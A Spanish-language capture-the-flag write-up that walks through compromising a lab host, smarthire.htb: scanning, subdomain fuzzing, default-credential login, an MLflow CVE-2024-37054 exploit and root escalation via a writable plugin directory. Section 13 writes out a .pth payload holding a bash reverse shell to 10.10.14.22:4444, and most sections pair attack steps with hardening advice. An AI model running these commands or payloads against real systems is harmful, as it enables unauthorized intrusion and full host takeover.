# Informe de análisis y enumeración

---

# 1. Escaneo inicial

Se realizó un escaneo de reconocimiento contra el objetivo `10.129.221.157` con el fin de identificar los servicios expuestos y obtener una visión inicial de la superficie de ataque. Durante esta fase solo se detectaron dos puertos abiertos: `22/tcp`, correspondiente a SSH, y `80/tcp`, correspondiente al servicio web ejecutado sobre nginx.

El escaneo también mostró que el servidor web redirigía al dominio `smarthire.htb`, por lo que fue necesario asociar ese nombre al host para continuar con la enumeración del servicio.

**Comando utilizado:**

```bash
nmap -sS --open -sC -sV -n -Pn 10.129.221.157
```

<img width="1889" height="786" alt="image" src="https://github.com/user-attachments/assets/42756380-a013-452a-9d95-b5f3134bd423" />

**Recomendaciones:**

- Restringir el acceso SSH por IP o mediante VPN.
- Mantener los servicios expuestos actualizados.
- Revisar si el host debería responder con redirecciones públicas.

---

# 2. Enumeración web inicial

Tras configurar la resolución del dominio, se accedió a la página principal del servicio web para revisar su contenido y comprobar si existían puntos de interacción visibles. La interfaz no mostraba elementos especialmente útiles ni formularios relevantes a primera vista, por lo que se realizó una revisión superficial del código fuente y de las rutas comunes.

Durante esta fase se confirmó que el sitio principal redirigía a `/login`, lo que indicaba la existencia de un panel de autenticación para parte de la aplicación.

**Comandos utilizados:**

```bash
whatweb http://smarthire.htb
curl -I http://smarthire.htb
```

<img width="1308" height="713" alt="image" src="https://github.com/user-attachments/assets/741f00ee-7262-4a08-a5f8-a591cd0bd011" />

<img width="1267" height="933" alt="image" src="https://github.com/user-attachments/assets/ee453949-45bc-4e3b-af7a-85f3238302b1" />

**Recomendaciones:**

- Ocultar información innecesaria en las cabeceras HTTP.
- Revisar que las páginas públicas no expongan rutas internas.
- Proteger el panel de inicio de sesión con controles adicionales como MFA.

---

# 3. Descubrimiento de subdominios

Dado que el servidor web estaba desplegado sobre nginx, se consideró la posibilidad de que existieran varios subdominios o una configuración basada en reverse proxy. Como la página principal ofrecía poca interacción, la enumeración se centró en descubrir virtual hosts asociados al dominio `smarthire.htb`.

Mediante fuzzing del encabezado `Host` se realizó una primera búsqueda de subdominios sin resultados de interés visibles. Sin embargo, al ampliar la enumeración apareció el subdominio `models.smarthire.htb`, que respondió con código `401 Unauthorized`, confirmando la existencia de un servicio adicional protegido.

**Comando utilizado:**

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.smarthire.htb" -u http://smarthire.htb -fs 0
```

<img width="1578" height="539" alt="image" src="https://github.com/user-attachments/assets/3b47d8e4-0683-4c39-91cd-10b024eac038" />

<img width="1882" height="713" alt="image" src="https://github.com/user-attachments/assets/5e32b6aa-8eb9-45c6-b2a2-dac3a716b366" />

**Recomendaciones:**

- Reducir la superficie pública de subdominios innecesarios.
- Proteger los servicios internos con autenticación robusta.
- Evitar banners o respuestas que faciliten el reconocimiento.

---

# 4. Rastreo y descubrimiento de rutas

Mientras se realizaba el descubrimiento de subdominios, también se llevó a cabo un rastreo sobre la aplicación principal para localizar rutas y archivos ocultos. Esta fase permitió descubrir recursos como `/login`, `/register`, varios archivos relacionados con Tailwind dentro de `/static/js/` y el archivo `template.html`.

Aunque estos hallazgos ampliaron el mapa inicial de la aplicación, el descubrimiento de `models.smarthire.htb` hizo que esta ruta pasara a ser menos relevante, al ofrecer una superficie de ataque más prometedora.

**Comando utilizado:**

```bash
katana -u http://smarthire.htb
```

<img width="736" height="627" alt="image" src="https://github.com/user-attachments/assets/7a2d3932-c214-4289-bfe5-bc6b35502b5d" />

**Recomendaciones:**

- Revisar qué recursos estáticos son realmente necesarios.
- Evitar dejar accesibles archivos de plantilla o de prueba.
- Eliminar referencias internas visibles en el frontend.

---

# 5. Acceso al subdominio

Al acceder a `models.smarthire.htb`, se confirmó que el contenido estaba expuesto públicamente. En ese momento no parecía existir una barrera de autenticación aparente, por lo que el servicio podía explorarse directamente desde el navegador.

Una vez identificado este comportamiento, se interactuó con la aplicación para comprender su funcionamiento interno y determinar si existían debilidades explotables.

**Comando utilizado:**

```bash
curl -i http://models.smarthire.htb
```

<img width="1477" height="709" alt="image" src="https://github.com/user-attachments/assets/cc6d8531-216d-49dd-bdb4-d986b6f5865d" />

**Recomendaciones:**

- No exponer interfaces administrativas sin control de acceso.
- Colocar el servicio detrás de un proxy con restricciones.
- Registrar y monitorizar el acceso a servicios internos.

---

# 6. Validación de acceso

Tras revisar el comportamiento del subdominio, se confirmó que sí existía un formulario de autenticación. Inicialmente se desconocían las credenciales exactas, por lo que se realizaron varios intentos hasta conseguir acceso. Como se trataba de un servicio expuesto en un subdominio, primero se probaron credenciales simples como `admin`, `test` y `password`, siguiendo un enfoque básico de validación de acceso común.

Después de identificar el formulario de acceso, se probaron credenciales por defecto y se logró autenticación con `admin` y `password`. Una vez dentro de la aplicación, se hizo una revisión inicial del contenido mediante `curl` y filtros de texto para localizar referencias a APIs, entornos de desarrollo o elementos administrativos. Durante esta revisión aparecieron varias pistas relacionadas con secciones orientadas a desarrollo, como “API Reference”, aunque todavía no se identificó funcionalidad claramente explotable.

<img width="1889" height="906" alt="image" src="https://github.com/user-attachments/assets/1ca790f0-f025-4355-898c-221ee82472d1" />

<img width="2045" height="981" alt="image" src="https://github.com/user-attachments/assets/01d23ca4-5e85-4fd3-a9ec-9dc113c89d7d" />

**Recomendaciones:**

- Aplicar políticas de contraseñas más fuertes.
- Limitar los intentos de autenticación.
- Activar bloqueo o alertas ante pruebas repetidas.

---

# 7. Identificación de la tecnología

Tras interactuar con el subdominio durante un tiempo y revisar su funcionamiento, se identificó que estaba basado en MLflow 2.14.1. A partir de ese momento se probaron varios exploits públicos relacionados con esta tecnología, aunque no todos resultaron efectivos.

Uno de los exploits era compatible y permitió avanzar más, ya que estaba relacionado con `CVE-2024-37054`, una vulnerabilidad vinculada a la deserialización insegura de modelos en MLflow. La versión 2.14.1 está entre las afectadas por este problema.

<img width="1904" height="913" alt="image" src="https://github.com/user-attachments/assets/337a2435-76e0-4f2d-8743-af04faead8d4" />

**Recomendaciones:**

- Mantener MLflow y sus dependencias actualizados en todo momento.
- Restringir la carga de modelos a fuentes de confianza.
- Evitar ejecutar artefactos no validados en entornos de producción.

---

# 8. Explotación de MLflow

Una vez validado el acceso al panel y confirmada la tecnología, se utilizó un exploit público compatible con la versión detectada. El proceso permitió registrar un modelo, manipular su artefacto correspondiente y activar la carga del modelo desde la aplicación principal, lo que derivó en ejecución remota de código.

Como resultado, se obtuvo una reverse shell en el sistema objetivo. El repositorio utilizado fue un PoC público de `CVE-2024-37054` orientado a RCE en MLflow.

**Comando utilizado:**

```bash
python3 exploit.py --mlflow http://models.smarthire.htb
```

<img width="1680" height="806" alt="image" src="https://github.com/user-attachments/assets/0600c5a2-5287-4dcd-b3a7-02c72e7627cc" />

<img width="1709" height="820" alt="image" src="https://github.com/user-attachments/assets/25dbc7e4-07dc-4da8-8a4f-af37df33a337" />

**Recomendaciones:**

- No permitir modelos procedentes de fuentes no verificadas.
- Ejecutar procesos de inferencia en un entorno aislado.
- Validar y aislar los artefactos antes de cargarlos.

---

# 9. Acceso inicial al sistema

La shell obtenida pertenecía al usuario `svcweb`. A partir de ese momento se realizó una enumeración inicial del entorno para localizar archivos relevantes de la aplicación y comprender mejor la estructura del sistema.

Dentro del directorio de trabajo se encontraron archivos como `app.py`, `config.py`, `.env`, `requirements.txt`, `smarthire.db`, `templates`, `static`, `utils` y `wsgi.py`, lo que confirmaba que se trataba de una aplicación Python con una base de datos local.

**Comandos utilizados:**

```bash
script /dev/null
ls
```

<img width="1374" height="614" alt="image" src="https://github.com/user-attachments/assets/ede63552-a259-45a0-9e44-a0d6931a38ad" />

**Recomendaciones:**

- Mantener credenciales y secretos fuera del código.
- Proteger los archivos `.env` y las configuraciones sensibles.
- Aplicar mínimo privilegio a la cuenta de servicio.
- No almacenar credenciales en texto claro.
- Usar variables seguras o gestores de secretos.
- Revisar permisos de lectura sobre los archivos de configuración.

---

# 10. Enumeración del sistema

Una vez dentro del sistema como `svcweb`, se revisó el archivo `/etc/passwd` para identificar usuarios locales y posibles cuentas de interés. La revisión mostró la presencia del usuario `lxd`, además de la cuenta de servicio `svcweb`.

A continuación, se comprobó la configuración de privilegios con `sudo -l` para verificar si existían permisos de ejecución privilegiada o malas configuraciones que pudieran ser útiles en una fase posterior.

**Comandos utilizados:**

```bash
cat /etc/passwd
sudo -l
```

<img width="2375" height="1139" alt="image" src="https://github.com/user-attachments/assets/3fadb14c-ed87-4ef4-889a-f571692240d8" />

<img width="2997" height="1438" alt="image" src="https://github.com/user-attachments/assets/3fbddb04-2274-4b08-a05a-848d8f131bca" />

**Recomendaciones:**

- Revisar cuentas del sistema con privilegios excesivos.
- Limitar las reglas de sudo a lo estrictamente necesario.
- Auditar los grupos con acceso a recursos sensibles.

---

# 11. Utilidad interna de administración

Durante la enumeración local se localizó el archivo `/opt/tools/mlflow_ctl/mlflowctl.py`. Se trata de una utilidad interna diseñada para administrar el servicio MLflow. El script permite acciones como `status`, `backup-models` y `restart`, y también incluye un sistema de plugins para cargar lógica específica del entorno.

Este hallazgo fue relevante porque mostraba una herramienta interna de administración capaz de ampliar funcionalidades mediante módulos auxiliares.

**Comando utilizado:**

```bash
cat /opt/tools/mlflow_ctl/mlflowctl.py
```

<img width="1349" height="1241" alt="image" src="https://github.com/user-attachments/assets/6f383438-d761-43fe-8654-15dca0418aa0" />

**Recomendaciones:**

- Restringir la ejecución de herramientas administrativas.
- Asegurar que los plugins se carguen solo desde rutas seguras.
- Evitar scripts privilegiados sin control estricto.

---

# 12. Revisión de plugins y permisos

Al inspeccionar el directorio de plugins asociado a la utilidad interna, se observó que existía un subdirectorio `dev` con permisos de escritura para grupo, mientras que otros componentes permanecían controlados por `root`. Además, el usuario `svcweb` pertenecía al grupo `devs`, lo que indicaba una configuración de permisos potencialmente débil.

Este punto fue especialmente interesante porque la herramienta cargaba módulos adicionales desde esa ubicación, lo que ampliaba la superficie de ataque del sistema.

**Comandos utilizados:**

```bash
ls -la /opt/tools/mlflow_ctl/
ls -la /opt/tools/mlflow_ctl/plugins/
id
cd /opt/tools/mlflow_ctl/plugins/
```

<img width="1715" height="911" alt="image" src="https://github.com/user-attachments/assets/98fe8c8f-e328-4239-804e-87aa753f2bb9" />

**Recomendaciones:**

- Revisar los permisos de escritura en directorios de plugins.
- Eliminar accesos de grupos innecesarios.
- Separar claramente archivos de producción y desarrollo.

---

# 13. Escalada de privilegios a root

Tras confirmar que el usuario tenía permisos sobre el directorio `dev`, se aprovechó la ejecución de la utilidad con sudo para cargar contenido controlado desde esa ruta. En el primer intento la sesión se cerró accidentalmente, por lo que el proceso tuvo que repetirse hasta obtener una conexión estable.

Finalmente, tras volver a ejecutar la herramienta con privilegios elevados, se obtuvo una nueva shell con permisos de root, confirmando la escalada completa de privilegios en el sistema.

**Comandos utilizados:**

```bash
echo 'import os; os.system("bash -c \"bash -i >& /dev/tcp/10.10.14.22/4444 0>&1\"")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
cat /root/root.txt
cat /home/svcweb/user.txt
```

<img width="2443" height="65" alt="image" src="https://github.com/user-attachments/assets/2aa2672a-952e-4521-95ec-15ba2eb6cc2e" />

<img width="2365" height="581" alt="image" src="https://github.com/user-attachments/assets/072914e5-2405-4992-9bd2-03529e1e5e0c" />

**Recomendaciones:**

- Evitar que usuarios no administrativos modifiquen plugins cargados por servicios.
- Revisar con cuidado cualquier mecanismo de ejecución dinámica.
- Ejecutar herramientas privilegiadas con rutas inmutables y controladas.

---

# 14. Resultado final

Durante el análisis se obtuvo acceso inicial a través de la explotación del servicio MLflow, se consiguió una shell como `svcweb`, posteriormente se identificó una configuración débil en la gestión de plugins y permisos, y finalmente se logró acceso root aprovechando la carga de contenido controlado desde el directorio `dev`.

El compromiso del host fue completo y demostró una cadena basada en exposición innecesaria, validación insuficiente y permisos inseguros sobre componentes internos.

**Artefactos obtenidos:**

- `user.txt`
- `root.txt`

**Diagrama de ataque:**

```text
Nmap
↓
smarthire.htb
↓
models.smarthire.htb
↓
MLflow 2.14.1
↓
CVE-2024-37054
↓
Shell (svcweb)
↓
/opt/tools/mlflow_ctl/
↓
plugins/dev writable
↓
sudo mlflowctl.py status
↓
root
```
